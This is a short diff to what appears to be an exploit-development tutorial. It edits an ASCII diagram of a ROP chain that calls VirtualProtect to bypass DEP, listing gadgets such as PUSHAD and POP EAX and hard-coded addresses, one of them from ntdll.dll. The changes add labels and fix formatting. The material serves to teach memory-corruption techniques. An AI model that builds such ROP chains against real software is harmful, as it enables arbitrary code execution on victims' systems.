@@ -533,13 +533,13 @@ The mitigations we will be using in the following examination are:
       0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
 ```
 ```
-          ---------------
+          ----------------
           |              | PUSHAD # RETN
           | 0x90909090   | 
 EAX       |              | POP EAX # RETN
           | 0x76f077c7   | RETN (ROP NOP)
 EDI       |              | POP EDI # RETN
-ECX       | 0x62504802   | 
+ECX       | 0x62504802   | &Writable location
           |              | POP ECX # RETN
 EDX       |              | XCHG EAX,EDX # RETN
           |              | NEG EAX # RETN
@@ -553,11 +553,11 @@ EBX       |              | XCHG EAX,EBX # RETN
 EBP       |              | POP EBP # RETN
 ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
           | 0x76796164   | ptr to &VirtualProtect()    
-          |              | # POP EBX # RETN
+          |              | POP EBX # RETN
           | ret addr     | -> retn
-          ---------------  <- ESP
+          ---------------- <- ESP
 ```
-
+Note: & means address of
 
 
 ## Test code
